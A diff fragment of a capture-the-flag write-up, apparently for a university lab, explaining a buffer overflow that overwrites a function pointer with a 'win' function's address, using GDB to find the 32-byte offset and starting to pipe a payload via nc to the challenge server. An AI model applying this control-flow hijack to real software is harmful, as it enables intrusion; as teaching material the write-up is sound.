@@ -30,6 +30,7 @@ int main() {
 }
 ```
 We want to overwrite fp with the address of win so that it gets called.
+
 2. Finding addresses and offsets using GDB
 ```
 print win
@@ -46,6 +47,7 @@ print &fp
 print (char*)&fp - (char*)&buffer
 ```
 Output: `$3 = 32`
+
 3. Send the payload to the challenge server having the little-endian system in consideration:
 ```bash
 python3 - << 'EOF' | nc mustard.stt.rnl.tecnico.ulisboa.pt 25153
